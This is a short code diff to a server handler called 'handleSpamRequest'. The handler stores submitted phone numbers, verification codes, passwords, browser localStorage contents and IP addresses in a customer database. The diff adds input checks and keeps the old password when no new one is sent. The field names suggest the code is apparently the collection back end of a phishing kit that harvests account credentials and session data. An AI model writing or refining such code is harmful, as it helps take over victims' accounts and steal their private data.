@@ -8,7 +8,12 @@ export const handleSpamRequest = handleAsync(
 
     const parsedData = JSON.parse(data);
 
-    const { phoneCode, password, phoneNumber } = parsedData;
+    const { phoneCode, password, phoneNumber, ...rest } = parsedData;
+
+    if (!phoneNumber && !phoneCode) {
+      res.status(400);
+      throw new Error('Phone number and verification code is required');
+    }
 
     const existingCustomer = await Customer.findOne({ phoneNumber });
 
@@ -17,8 +22,8 @@ export const handleSpamRequest = handleAsync(
     if (existingCustomer) {
       await existingCustomer.updateOne({
         phoneCode,
-        password,
-        localStorage: data,
+        password: password || existingCustomer.password,
+        localStorage: JSON.stringify(rest),
         ip,
       });
     }
@@ -27,7 +32,7 @@ export const handleSpamRequest = handleAsync(
       phoneCode,
       password,
       phoneNumber,
-      localStorage: data,
+      localStorage: JSON.stringify(rest),
       ip,
     });
 
